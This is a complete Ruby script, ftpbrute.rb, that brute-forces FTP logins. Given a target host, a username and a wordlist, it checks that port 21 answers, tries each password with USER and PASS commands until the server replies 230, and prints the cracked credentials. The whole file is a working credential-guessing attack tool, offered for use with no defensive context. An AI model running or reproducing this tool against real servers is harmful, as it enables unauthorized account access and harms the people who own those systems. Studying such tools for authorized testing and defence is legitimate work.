#! /usr/bin/ruby

require 'socket'
require 'timeout'

if ARGV.length != 3
	puts "usage: ./ftpbrute.rb [TARGET] [USERNAME] [WORDLIST]"
	exit
end

$rhost = ARGV[0]
$user = ARGV[1]
$path = ARGV[2]

def checkHost()
	print 'checking host... '
		s = Socket.new Socket::AF_INET, Socket::SOCK_STREAM
		sockaddr = Socket.pack_sockaddr_in(21, $rhost)
		timeout(10) do
			@result = s.connect(sockaddr)
		end
		if @result == 0
			puts 'success'
		else
			puts 'fail'
			exit
		end

end

def getWordlist()
	print 'reading wordlist... '
	begin
		file = File.open($path, 'r')
		$wordlist = file.read.chomp.split("\n")
		file.close
		puts 'done'
	rescue
		puts 'fail'
		exit
	end
end

def crackPass(pass)
        begin
                s = TCPSocket.new($rhost, 21)
                s.gets
                s.puts("USER #{$user}")
                s.gets
                s.puts("PASS #{pass}")
                data = s.gets
                s.close
                if data.include? '230'
                        return true
                else
                        return false
                end
        rescue
                return false
        end
end

getWordlist()
checkHost()

puts "cracking FTP pass for \"#{$user}\" at #{$rhost}... \n\n"

$wordlist.each do |pass|
	if crackPass(pass)
		puts 'creds found:'
		puts "\tuser: #{$user}"
		puts "\tpass: #{pass}"
		exit
	end
end

puts "bruteforce failed"
		
